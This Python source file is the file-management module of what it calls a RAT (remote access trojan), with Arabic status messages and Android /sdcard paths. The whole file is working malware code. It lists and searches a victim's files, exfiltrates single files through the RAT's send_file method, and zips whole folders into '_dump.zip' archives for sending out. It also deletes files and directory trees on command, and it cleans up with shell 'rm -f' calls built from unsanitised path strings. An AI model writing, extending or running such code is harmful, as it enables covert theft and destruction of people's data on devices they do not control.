import os, zipfile, time

class FileManager:
    def __init__(self, rat_instance):
        self.rat = rat_instance
        self.max_single = 45 * 1024 * 1024

    def list_directory(self, path: str, max_items: int = 40) -> str:
        if not os.path.exists(path):
            return f"❌ المسار غير موجود: {path}"
        if not os.path.isdir(path):
            return self._file_info(path)
        try:
            items = sorted(os.listdir(path))
        except PermissionError:
            return f"❌ لا صلاحيات: {path}"
        if not items:
            return f"📂 {path}\n(فارغ)"
        result = f"📂 {path}\n{'─'*40}\n"
        dirs_list, files_list = [], []
        for item in items:
            full = os.path.join(path, item)
            try:
                if os.path.isdir(full):
                    dirs_list.append(f"📁 {item}/")
                else:
                    try:
                        size = os.path.getsize(full)
                    except:
                        size = 0
                    size_str = f"{size/1024:.1f}KB" if size < 1024*1024 else f"{size/1024/1024:.1f}MB"
                    files_list.append(f"📄 {item} ({size_str})")
            except:
                pass
        result += "\n".join(dirs_list) + ("\n" if dirs_list and files_list else "") + "\n".join(files_list[:max_items])
        total = len(dirs_list) + len(files_list)
        if total > max_items:
            result += f"\n... +{total - max_items} عنصر"
        result += f"\n\n📊 {len(dirs_list)} مجلد | {len(files_list)} ملف"
        return result

    def _file_info(self, path: str) -> str:
        try:
            stat = os.stat(path)
            size = stat.st_size
            size_str = f"{size}B" if size<1024 else f"{size/1024:.0f}KB" if size<1024*1024 else f"{size/1024/1024:.1f}MB"
            mod = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stat.st_mtime))
            return f"📄 الملف: {path}\nالحجم: {size_str}\nآخر تعديل: {mod}"
        except:
            return f"❌ خطأ في قراءة: {path}"

    def download_file(self, path: str) -> str:
        if not os.path.exists(path):
            return f"❌ غير موجود: {path}"
        if os.path.isdir(path):
            return self._download_directory(path)
        size = os.path.getsize(path)
        fname = os.path.basename(path)
        if size > self.max_single:
            return f"⚠️ كبير جداً ({size/1024/1024:.1f}MB)"
        sent = self.rat.send_file(path, f"📄 {fname} ({size/1024:.1f}KB)")
        return f"✅ {fname}" if sent else f"❌ فشل: {fname}"

    def _download_directory(self, path: str) -> str:
        dirname = os.path.basename(path.rstrip('/'))
        zip_path = f"/sdcard/{dirname}_dump.zip"
        total_files = 0
        total_size = 0
        for _, _, files in os.walk(path):
            total_files += len(files)
        if total_files > 500:
            return f"⚠️ كبير ({total_files} ملف)"
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(path):
                    for file in files:
                        fp = os.path.join(root, file)
                        arc = os.path.relpath(fp, os.path.dirname(path))
                        try:
                            zf.write(fp, arc)
                        except:
                            pass
            zip_size = os.path.getsize(zip_path)
            sent = self.rat.send_file(zip_path, f"📁 {dirname} | {total_files} ملف | {zip_size/1024:.1f}KB")
            os.system(f"rm -f {zip_path}")
            return f"✅ {dirname} ({total_files} ملف)" if sent else "❌ فشل الإرسال"
        except Exception as e:
            os.system(f"rm -f {zip_path}")
            return f"❌ خطأ: {e}"

    def search_files(self, directory: str, pattern: str) -> str:
        import fnmatch
        if not os.path.exists(directory):
            return f"❌ غير موجود: {directory}"
        matches = []
        try:
            for root, _, files in os.walk(directory):
                for f in files:
                    if fnmatch.fnmatch(f.lower(), pattern.lower()):
                        matches.append(os.path.join(root, f))
                if len(matches) >= 30:
                    break
        except:
            return "❌ خطأ في البحث"
        if not matches:
            return f"🔍 لا نتائج لـ {pattern}"
        result = f"🔍 نتائج {pattern}:\n{'─'*40}\n"
        for m in matches[:25]:
            try:
                sz = os.path.getsize(m)
                szs = f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
            except:
                szs = "?"
            result += f"📄 {m} ({szs})\n"
        return result

    def delete_file(self, path: str) -> str:
        if not os.path.exists(path):
            return f"❌ غير موجود: {path}"
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
            else:
                os.remove(path)
            return f"🗑️ تم الحذف: {path}"
        except Exception as e:
            return f"❌ فشل: {e}"
